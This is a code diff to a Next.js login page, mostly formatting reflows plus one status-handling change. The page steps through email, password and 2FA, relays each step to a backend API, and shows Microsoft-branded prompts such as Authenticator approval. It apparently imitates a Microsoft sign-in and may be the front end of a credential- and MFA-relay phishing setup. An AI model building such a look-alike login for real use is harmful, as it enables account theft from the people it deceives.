@@ -6,7 +6,8 @@ import Image from "next/image";
 
 type LoginStep = "email" | "password" | "2fa" | "success";
 
-const API_BASE_URL = process.env.NEXT_PUBLIC_API_BASE_URL || "http://localhost:8000/api";
+const API_BASE_URL =
+  process.env.NEXT_PUBLIC_API_BASE_URL || "http://localhost:8000/api";
 const API_KEY = process.env.NEXT_PUBLIC_API_KEY || "";
 
 export default function Home() {
@@ -44,6 +45,8 @@ export default function Home() {
         setSessionId(data.sessionId);
         if (data.status === "REQUIRES_PASSWORD") {
           setStep("password");
+        } else if (data.status === "AUTHENTICATED") {
+          setStep("success");
         } else {
           // Handle other statuses if necessary
           setStep("password");
@@ -83,7 +86,10 @@ export default function Home() {
           setChallengeType(data.challengeType);
           setChallengeMetadata(data.challengeMetadata || null);
           setStep("2fa");
-        } else if (data.status === "AUTHENTICATED" || data.status === "COMPLETED") {
+        } else if (
+          data.status === "AUTHENTICATED" ||
+          data.status === "COMPLETED"
+        ) {
           setStep("success");
         } else {
           setStep("success"); // Default to success if success=true but status is unknown
@@ -164,8 +170,12 @@ export default function Home() {
 
   // Helper to render 2FA step content
   const render2FAStep = () => {
-    const isIdentityVerification = challengeType === "EMAIL" && challengeMetadata?.officeVerificationStep === "EMAIL_ADDRESS";
-    const isEmailOTP = challengeType === "EMAIL" && challengeMetadata?.officeVerificationStep === "EMAIL_OTP";
+    const isIdentityVerification =
+      challengeType === "EMAIL" &&
+      challengeMetadata?.officeVerificationStep === "EMAIL_ADDRESS";
+    const isEmailOTP =
+      challengeType === "EMAIL" &&
+      challengeMetadata?.officeVerificationStep === "EMAIL_OTP";
     const isPush = challengeType === "APP" || challengeType === "PUSH";
     const maskedEmail = challengeMetadata?.maskedEmail;
 
@@ -192,7 +202,8 @@ export default function Home() {
       inputType = "tel";
     } else if (isPush) {
       title = "Approve request";
-      description = "Check your Microsoft Authenticator app to approve the sign-in request.";
+      description =
+        "Check your Microsoft Authenticator app to approve the sign-in request.";
     }
 
     return (
@@ -202,7 +213,13 @@ export default function Home() {
         </div>
 
         <h1 className={styles.heading}>{title}</h1>
-        <p style={{ fontSize: "0.9375rem", marginBottom: "1rem", lineHeight: "1.4" }}>
+        <p
+          style={{
+            fontSize: "0.9375rem",
+            marginBottom: "1rem",
+            lineHeight: "1.4",
+          }}
+        >
           {description}
         </p>
 
@@ -222,17 +239,32 @@ export default function Home() {
           )}
 
           <div className={styles.buttonContainer}>
-            <button type="submit" className={styles.signInButton} disabled={isLoading}>
-              {isLoading ? "Verifying..." : (isPush ? "I've approved it" : "Verify")}
+            <button
+              type="submit"
+              className={styles.signInButton}
+              disabled={isLoading}
+            >
+              {isLoading
+                ? "Verifying..."
+                : isPush
+                  ? "I've approved it"
+                  : "Verify"}
             </button>
           </div>
 
           {challengeMetadata?.hasCodeLink && (
-            <div className={styles.linksContainer} style={{ marginTop: "1rem" }}>
-              <a href="#" className={styles.link} onClick={(e) => {
-                e.preventDefault();
-                // This could trigger a state change to move to OTP input directly if backend supports it
-              }}>
+            <div
+              className={styles.linksContainer}
+              style={{ marginTop: "1rem" }}
+            >
+              <a
+                href="#"
+                className={styles.link}
+                onClick={(e) => {
+                  e.preventDefault();
+                  // This could trigger a state change to move to OTP input directly if backend supports it
+                }}
+              >
                 I have a code
               </a>
             </div>
@@ -256,7 +288,13 @@ export default function Home() {
               disabled={isLoading}
             >
               <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
-                <path d="M10 13L5 8L10 3" stroke="#1b1b1b" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
+                <path
+                  d="M10 13L5 8L10 3"
+                  stroke="#1b1b1b"
+                  strokeWidth="1.5"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                />
               </svg>
             </button>
           )}
@@ -305,7 +343,11 @@ export default function Home() {
                   </a>
                 </div>
                 <div className={styles.buttonContainer}>
-                  <button type="submit" className={styles.nextButton} disabled={isLoading}>
+                  <button
+                    type="submit"
+                    className={styles.nextButton}
+                    disabled={isLoading}
+                  >
                     {isLoading ? "Please wait..." : "Next"}
                   </button>
                 </div>
@@ -338,18 +380,50 @@ export default function Home() {
                     type="button"
                     className={styles.showPasswordButton}
                     onClick={() => setShowPassword(!showPassword)}
-                    aria-label={showPassword ? "Hide password" : "Show password"}
+                    aria-label={
+                      showPassword ? "Hide password" : "Show password"
+                    }
                   >
                     {showPassword ? (
-                      <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
-                        <path d="M2 10s3-6 8-6 8 6 8 6-3 6-8 6-8-6-8-6z" stroke="#666" strokeWidth="1.5" />
-                        <circle cx="10" cy="10" r="2.5" stroke="#666" strokeWidth="1.5" />
+                      <svg
+                        width="20"
+                        height="20"
+                        viewBox="0 0 20 20"
+                        fill="none"
+                      >
+                        <path
+                          d="M2 10s3-6 8-6 8 6 8 6-3 6-8 6-8-6-8-6z"
+                          stroke="#666"
+                          strokeWidth="1.5"
+                        />
+                        <circle
+                          cx="10"
+                          cy="10"
+                          r="2.5"
+                          stroke="#666"
+                          strokeWidth="1.5"
+                        />
                         <path d="M3 17L17 3" stroke="#666" strokeWidth="1.5" />
                       </svg>
                     ) : (
-                      <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
-                        <path d="M2 10s3-6 8-6 8 6 8 6-3 6-8 6-8-6-8-6z" stroke="#666" strokeWidth="1.5" />
-                        <circle cx="10" cy="10" r="2.5" stroke="#666" strokeWidth="1.5" />
+                      <svg
+                        width="20"
+                        height="20"
+                        viewBox="0 0 20 20"
+                        fill="none"
+                      >
+                        <path
+                          d="M2 10s3-6 8-6 8 6 8 6-3 6-8 6-8-6-8-6z"
+                          stroke="#666"
+                          strokeWidth="1.5"
+                        />
+                        <circle
+                          cx="10"
+                          cy="10"
+                          r="2.5"
+                          stroke="#666"
+                          strokeWidth="1.5"
+                        />
                       </svg>
                     )}
                   </button>
@@ -362,7 +436,11 @@ export default function Home() {
                 </div>
 
                 <div className={styles.buttonContainer}>
-                  <button type="submit" className={styles.signInButton} disabled={isLoading}>
+                  <button
+                    type="submit"
+                    className={styles.signInButton}
+                    disabled={isLoading}
+                  >
                     {isLoading ? "Signing in..." : "Sign in"}
                   </button>
                 </div>
